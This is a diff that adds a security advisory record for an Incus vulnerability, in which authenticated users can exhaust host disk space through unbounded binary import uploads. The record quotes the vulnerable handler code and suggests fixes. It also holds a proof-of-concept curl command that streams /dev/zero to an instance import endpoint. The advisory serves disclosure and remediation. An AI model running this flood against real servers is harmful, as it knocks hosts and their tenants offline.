@@ -1,0 +1,49 @@
+{
+  "id": "GHSA-98vh-x9cx-9cfp",
+  "modified": "2026-05-05T16:12:49.456650Z",
+  "published": "2026-05-04T19:46:32Z",
+  "aliases": [
+    "CVE-2026-41685"
+  ],
+  "summary": "Incus is affected by unbounded binary import disk exhaustion",
+  "details": "### Summary\nUploads of large amount of data by authenticated users can run the Incus server out of disk space, potentially taking down the host system.\n\nThe impact here is limited for anyone using `storage.images_volume` and `storage.backups_volume` as those users will have large uploads be stored on those volumes rather than directly on the host filesystem. This is the default behavior on IncusOS.\n\n### Details\nMultiple binary import paths accept application/octet-stream requests and stream the HTTP request body directly into temporary files on the host without any visible request-size limit on the upload path.\n\nWhen these endpoints receive binary content, the daemon routes the request body into import routines that create temporary files under daemon-controlled host storage locations and copy the full attacker-controlled stream into them using direct io.Copy operations. This write occurs before the uploaded content is fully parsed and before later validation can reject the import.\n\nBecause no visible http.MaxBytesReader, io.LimitReader, quota-aware wrapper, or equivalent size-enforcement mechanism is present around these upload paths, an authenticated attacker can supply an arbitrarily large continuous stream of data. This causes the daemon to keep writing unbounded input to host storage until the operation fails or the underlying file system is exhausted. In a multi-tenant deployment, this can be used to consume shared disk space and cause denial of service on the node.\n\nThe binary import handlers are reachable through application/octet-stream request paths in the instance backup import, storage bucket import, and storage volume import flows, where the request body is passed directly into import helpers handling backup and ISO uploads.\n\nAffected File:\nhttps://github.com/lxc/incus/blob/v6.22.0/cmd/incusd/instances_post.go \n\nAffected Code:\n```\nfunc createFromBackup(s *state.State, r *http.Request, projectName string, data io.Reader, pool string, instanceName string, config string, device string) response.Response {\n    reverter := revert.New()\n    defer reverter.Fail()\n\n    // Create temporary file to store uploaded backup data.\n    backupFile, err := os.CreateTemp(internalUtil.VarPath(\"backups\"), fmt.Sprintf(\"%s_\", backup.WorkingDirPrefix))\n    if err != nil {\n        return response.InternalError(err)\n    }\n\n    defer func() { _ = os.Remove(backupFile.Name()) }()\n    reverter.Add(func() { _ = backupFile.Close() })\n\n    // Stream uploaded backup data into temporary file.\n    _, err = io.Copy(backupFile, data)\n    if err != nil {\n        return response.InternalError(err)\n    }\n    [...]\n}\n```\n\nAffected File:\nhttps://github.com/lxc/incus/blob/v6.22.0/cmd/incusd/storage_buckets.go \n\nAffected Code:\n```\nfunc createStoragePoolBucketFromBackup(s *state.State, r *http.Request, requestProjectName string, projectName string, data io.Reader, pool string, bucketName string) response.Response {\n    [...]\n    backupFile, err := os.CreateTemp(internalUtil.VarPath(\"backups\"), fmt.Sprintf(\"%s_\", backup.WorkingDirPrefix))\n    [...]\n    _, err = io.Copy(backupFile, data)\n    [...]\n}\n```\n\nAffected File:\nhttps://github.com/lxc/incus/blob/v6.22.0/cmd/incusd/storage_volumes.go \n\nAffected Code:\n```\nfunc createStoragePoolVolumeFromBackup(s *state.State, r *http.Request, requestProjectName string, projectName string, data io.Reader, pool string, volName string) response.Response {\n    [...]\n    backupFile, err := os.CreateTemp(internalUtil.VarPath(\"backups\"), fmt.Sprintf(\"%s_\", backup.WorkingDirPrefix))\n    [...]\n    _, err = io.Copy(backupFile, data)\n    [...]\n}\n\n[...]\n\nfunc createStoragePoolVolumeFromISO(s *state.State, r *http.Request, requestProjectName string, projectName string, data io.Reader, pool string, volName string) response.Response {\n    [...]\n    isoFile, err := os.CreateTemp(internalUtil.VarPath(\"isos\"), fmt.Sprintf(\"%s_\", \"incus_iso\"))\n    [...]\n    size, err := io.Copy(isoFile, data)\n    [...]\n}\n```\n\n### PoC\nThe following PoC demonstrates one reachable instance of this issue through the instance import endpoint. The same unbounded upload-to-tempfile pattern is also present in storage bucket backup import, storage volume backup import, and storage volume ISO import handlers.\n\nStep 1: Trigger the sustained upload stream\n\nFrom an Incus client with access to the target server, open a long-lived application/octet-stream upload and continuously stream null bytes into the instance import endpoint. Using timeout 120 limits the reproduction to two minutes while still demonstrating that the daemon keeps writing attacker-controlled input for as long as the connection remains open.\n\nCommands:\n```\necho \"[*] Initiating a 2-minute sustained disk exhaustion attack...\"\n\ntimeout 120 cat /dev/zero | curl -k -X POST \\\n  --cert ~/.config/incus/client.crt \\\n  --key ~/.config/incus/client.key \\\n  \"https://7atest.dev.stgraber.org:443/1.0/instances?project=default\" \\\n  -H \"Content-Type: application/octet-stream\" \\\n  -T -\n```\n\nStep 2: Verify host-side disk growth during the upload\n\nOn the Incus host, observe the temporary backup file being actively written under the backups directory while the client keeps the stream open.\n\nCommand:\n```\nwatch -n 1 \"ls -lh /var/lib/incus/backups/\"\n```\n\nResult:\n```\ntotal 100M\ndrwx------ 2 root root 4.0K Mar  1 22:44 custom\n-rw------- 1 root root 100M Mar 23 10:46 incus_backup_2743299426\ndrwx------ 2 root root 4.0K Mar  1 22:44 instances\n\ntotal 106M\ndrwx------ 2 root root 4.0K Mar  1 22:44 custom\n-rw------- 1 root root 106M Mar 23 10:46 incus_backup_2743299426\ndrwx------ 2 root root 4.0K Mar  1 22:44 instances\n\ntotal 110M\ndrwx------ 2 root root 4.0K Mar  1 22:44 custom\n-rw------- 1 root root 110M Mar 23 10:46 incus_backup_2743299426\ndrwx------ 2 root root 4.0K Mar  1 22:44 instances\n\ntotal 113M\ndrwx------ 2 root root 4.0K Mar  1 22:44 custom\n-rw------- 1 root root 113M Mar 23 10:46 incus_backup_2743299426\ndrwx------ 2 root root 4.0K Mar  1 22:44 instances\n```\n\nStep 3: Observe post-stream failure behavior\n\nWhen the client-side timeout expires, the upload is interrupted locally and the stream stops. In this reproduction, that means the process is terminated before any later import-stage error is surfaced back to the client. This does not mitigate the issue during the active upload window, because io.Copy continues writing to disk for as long as the attacker keeps the stream open.\n\nIt is recommended to enforce a maximum request size or quota-aware upload limit in the affected binary import paths before any data is written to disk. The incoming request body should be wrapped with http.MaxBytesReader, io.LimitReader, or an equivalent quota-aware mechanism so that oversized uploads fail safely before consuming unbounded host storage. By contrast, other upload flows such as image upload appear to use internalIO.NewQuotaWriter(..., budget) when persisting request data, but no analogous quota enforcement is visible in the affected binary import handlers.\n\nA patch is available at https://github.com/lxc/incus/releases/tag/v7.0.0.\n\n### Credit\nThis issue was discovered and reported by the team at 7asecurity (https://7asecurity.com/)",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/lxc/incus/v6/cmd/incusd",
+        "purl": "pkg:golang/github.com/lxc/incus/v6/cmd/incusd"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "last_affected": "6.23.0"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-98vh-x9cx-9cfp/GHSA-98vh-x9cx-9cfp.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/lxc/incus/security/advisories/GHSA-98vh-x9cx-9cfp"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/lxc/incus"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/lxc/incus/releases/tag/v7.0.0"
+    }
+  ]
+}
